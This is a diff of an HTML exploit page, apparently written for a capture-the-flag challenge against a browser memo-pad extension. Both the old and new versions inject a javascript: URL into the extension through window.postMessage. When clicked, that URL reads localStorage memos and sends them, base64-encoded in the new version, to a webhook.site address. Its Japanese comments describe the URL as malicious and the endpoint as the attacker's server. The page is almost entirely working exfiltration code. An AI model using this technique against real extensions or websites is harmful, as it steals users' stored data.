@@ -1,31 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit Page</title>
-</head>
 <body>
-    <h1>Click the button to exploit</h1>
+    <h1>Browser Memo Pad Exploit</h1>
+    <p>Waiting for bot...</p>
     <script>
-        sendPayload()
-        function sendPayload() {
-            // This is the URL of the bot's server where the flag will be sent.
-            const botUrl = "http://chal2.fwectf.com:8013/";
-            
-            // The flag is sent as the text of the memo.
-            // The bot.js file reveals that the flag is in the URL fragment.
-            // When the bot opens a new tab, the flag will be appended to the URL as a fragment.
-            const memoText = "FLAG_PLACEHOLDER"; // Replace with the actual flag value.
-            
-            // Post a message to the content script to create a memo.
+        window.addEventListener("message", (event) => {
+            if (event.source !== window) return;
+
+            // `bot.js`からフラグを含むメッセージを受信
             if (event.data?.type === "create") {
-                const encodedUrl = encodeURIComponent(`javascript:fetch("https://webhook.site/d8975503-1e4d-4d52-a0fd-ce4dca2c4174" + document.querySelector("meta[memopad-extensionId]").getAttribute("memopad-extensionId") + "/" + localStorage.getItem("memos"))`);
-                window.postMessage({
-                    type: 'create',
-                    payload: encodedUrl
-                });
+                // 拡張機能がメモとして保存する悪意のあるURLを生成
+                // このURLは、botがクリックすると`localStorage`からメモ（フラグ）を抜き取り、
+                // 攻撃者のサーバー（webhook.site）に送信する
+                const maliciousUrl = `javascript:fetch("https://webhook.site/d8975503-1e4d-4d52-a0fd-ce4dca2c4174/" + btoa(localStorage.getItem("memos")))`;
+                
+                // 拡張機能の`content.js`に悪意のあるURLを送信し、メモとして保存させる
+                window.postMessage({ type: 'create', payload: maliciousUrl });
             }
-            // Wait a moment and then navigate to the popup page, which will trigger the URL with the fragment.
-        }
+        });
     </script>
 </body>
 </html>
